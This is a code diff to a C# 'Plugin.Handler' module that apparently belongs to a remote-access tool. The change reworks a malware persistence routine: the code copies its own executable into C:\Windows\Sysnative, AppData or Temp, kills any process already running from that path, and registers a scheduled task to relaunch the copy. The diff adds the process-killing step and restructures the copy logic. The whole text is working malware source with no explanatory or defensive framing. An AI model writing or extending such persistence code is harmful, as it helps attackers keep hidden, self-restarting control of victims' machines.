@@ -25,19 +25,33 @@ namespace Plugin.Handler
             try
             {
                 string name = Process.GetCurrentProcess().ProcessName + ".exe";
+
                 if (Methods.IsAdmin()&& Environment.Is64BitOperatingSystem) 
                 {
+                    string filepath;
                     try
                     {
-                        string filepath = Path.Combine(@"C:\Windows\Sysnative", name);
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        filepath = Path.Combine(@"C:\Windows\Sysnative", name);
                     }
                     catch
                     {
-                        string filepath = Path.Combine(Path.GetTempPath(), name);
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        filepath = Path.Combine(Path.GetTempPath(), name);                        
                     }
-                    
+                    FileInfo installPath = new FileInfo(filepath);
+                    if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
+                    {
+
+                        foreach (Process P in Process.GetProcesses())
+                        {
+                            try
+                            {
+                                if (P.MainModule.FileName == installPath.FullName)
+                                    P.Kill();
+                            }
+                            catch { }
+                        }
+                    }
+                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                     TaskService ts = new TaskService();
                     TaskDefinition td = ts.NewTask();
                     td.RegistrationInfo.Description = Description;
@@ -55,16 +69,29 @@ namespace Plugin.Handler
                 } 
                 else
                 {
+                    string filepath;
                     try
                     {
-                        string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                     }
                     catch
                     {
-                        string filepath = Path.Combine(Path.GetTempPath(), name);
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        filepath = Path.Combine(Path.GetTempPath(), name);
                     }
+                    FileInfo installPath = new FileInfo(filepath);
+                    if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
+                    {
+                        foreach (Process P in Process.GetProcesses())
+                        {
+                            try
+                            {
+                                if (P.MainModule.FileName == installPath.FullName)
+                                    P.Kill();
+                            }
+                            catch { }
+                        }
+                    }
+                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                     TaskService ts = new TaskService();
                     TaskDefinition td = ts.NewTask();
                     td.RegistrationInfo.Description = Description;
@@ -80,8 +107,6 @@ namespace Plugin.Handler
                     td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
                     ts.RootFolder.RegisterTaskDefinition(Task, td);
                 }
-                
-
             }
             catch (Exception ex)
             {
